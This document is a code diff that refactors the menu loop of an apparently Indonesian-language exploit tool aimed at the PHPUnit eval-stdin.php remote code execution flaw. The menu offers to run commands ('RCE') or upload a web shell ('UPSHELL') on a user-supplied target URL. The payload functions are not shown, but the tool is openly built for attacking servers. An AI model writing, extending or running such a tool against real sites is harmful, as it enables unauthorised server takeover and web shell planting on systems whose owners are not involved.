@@ -63,32 +63,40 @@ def NuLzUPSHELL(target):
 def NuLzGG():
     clear()
     banner()
-    print('Target Example: https://domain.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
-    target = input('TARGET >: ')
-    print('''
+    while True:
+        try:
+            print('Target Example: https://domain.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
+            target = input('TARGET >: ')
+            print('''
 [ Select Option ]
 --------------------------
 [1] RCE (Command)
 [2] UPSHELL (Upload Shell)
 --------------------------
-''')
-    select_payload = input("Select >: ")
-    if select_payload:
-        try:
-            selected_payload = int(select_payload)
-            if selected_payload == 1:
-                NuLzCMD(target)
-            elif selected_payload == 2:
-                NuLzUPSHELL(target)
-        except ValueError:
-            print('Mohon Masukan Pilihan Dengan Benar')
-    else:
-        print('Mohon Masukan Pilihan Dengan Benar')
-
-if __name__ == '__main__':
-    while True:
-        try:
-            NuLzGG()
+        ''')
+            select_payload = input("Select >: ")
+            if select_payload:
+                try:
+                    selected_payload = int(select_payload)
+                    if selected_payload == 1:
+                        NuLzCMD(target)
+                    elif selected_payload == 2:
+                        NuLzUPSHELL(target)
+                        quest = input('\nApakah anda ingin keluar? Y/N >: ')
+                        if quest:
+                            if quest == 'y' or quest == 'Y':
+                                print('Anda Keluar!')
+                                exit()
+                            elif quest == 'n' or quest == 'N':
+                                continue
+                            else:
+                                print('Mohon Masukan Pilihan Dengan Benar')
+                        else:
+                            print('Mohon Masukan Pilihan Dengan Benar')
+                except ValueError:
+                    print('Mohon Masukan Pilihan Dengan Benar')
+            else:
+                print('Mohon Masukan Pilihan Dengan Benar')
         except KeyboardInterrupt:
             quest = input('\nApakah anda ingin keluar? Y/N >: ')
             if quest:
@@ -99,7 +107,8 @@ if __name__ == '__main__':
                     continue
                 else:
                     print('Mohon Masukan Pilihan Dengan Benar')
-                    continue
             else:
                 print('Mohon Masukan Pilihan Dengan Benar')
-                continue
+
+if __name__ == '__main__':
+    NuLzGG()
